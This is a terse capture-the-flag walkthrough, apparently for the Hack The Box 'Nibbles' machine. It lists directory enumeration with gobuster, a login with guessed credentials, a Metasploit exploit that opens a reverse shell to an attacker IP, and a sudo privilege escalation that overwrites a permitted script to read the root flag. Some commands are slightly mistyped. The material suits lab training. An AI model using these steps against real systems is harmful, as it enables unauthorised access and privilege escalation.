1.go to the browser paste the ip the url
2.run the gobuster dir -u http://10.129.x.x/nibbleblog/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
this will help you find directories
3.go to the admin directory you find
4.log in
5.credentials are admin and nibbles, you found them by guessing
6.find the version of nibbleblog
7.search for an exploit by first identifying the version
8.start metasploit
9.set options
set LHOST 10.10.15.83
set USERNAME admin
set PASSWORD nibbles
set RHOSTS 10.129.x.x
set TARGETURI /nibbleblog/
10.run the exploit by typing exploit
11.type shell to get a shell
12.upgrade the shell 
13.python3 -c 'import pty; pty.spawn("/bin/bash")'
14.fix terminal display export TERM=xterm
15.run sudo l to see what you can run as admin
16.notice you can run monitor.sh as admin
17.go to directory cd/home/nibbler
18.unzip file
19.unzip personal file
20.over write monitor.sh with personal file
21.echo "cat /root/root.txt" > personal/stuff/monitor.sh
22.run monitor.sh as root
23.sudo ./personal/stuff/monitor.sh